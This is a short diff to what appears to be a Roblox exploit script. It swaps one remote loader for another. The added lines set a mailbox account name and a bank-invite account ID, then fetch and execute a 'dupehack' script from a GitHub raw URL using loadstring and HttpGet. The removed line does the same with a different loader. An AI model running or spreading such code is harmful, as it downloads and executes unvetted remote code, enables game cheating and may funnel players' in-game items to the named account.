@@ -1,1 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/lxnnydev/Delta-PSX/main/loader.lua"))();
+getgenv().YourAccNameThatGetsMailbox = "Wizard_CatWhite"
+getgenv().YourAccountIdForBankInvite = 23423423
+loadstring(game:HttpGet('https://raw.githubusercontent.com/NukeVsCity/Scripts2022/main/dupehack'))()
